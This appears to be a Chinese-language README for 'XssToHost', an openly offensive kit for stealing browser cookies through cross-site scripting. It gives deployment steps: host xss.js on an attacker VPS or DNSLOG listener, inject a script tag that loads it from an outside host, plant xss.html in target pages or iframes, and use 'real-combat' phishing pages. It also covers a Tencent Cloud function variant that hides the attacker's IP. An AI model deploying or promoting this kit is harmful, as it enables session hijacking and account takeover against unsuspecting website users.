# XssToHost

通过js跨域请求到DNSLOG平台或自己的VPS主机，并实现cookie外带  

## Usage 

1.将xss.js中的http地址改为带有监听功能的服务器，比如DNSLOG或者开了监听的VPS  
2.将xss.js部署在自己的VPS上  
3.当可以打xss时，可用

```html
<script src="http://exmaple.com/xss.js"></script>
```

方式远程加载此文件  
4.如遇到可上传HTML并解析的情况，可将xss.html上传到目标页面，远程加载xss.js。或者是利用iframe等可引用html的标签加载xss.html  

5.xss2.html与xssfish.html为实战型，修改相关域名直接将html内的语句复制到有xss位置的地方即可  

6.SCFxss.py为腾讯云函数配置文件，修改文件中的EXAMPLE.COM为自己的VPS或者DNSLOG后，直接在云函数中配置即可，触发器为api网关，勾选集成响应，额外的可勾选CORS，并根据官方提示新建相应插件并绑定API即可。云函数版本是xss.html的增强版本，具有隐匿IP的特性  
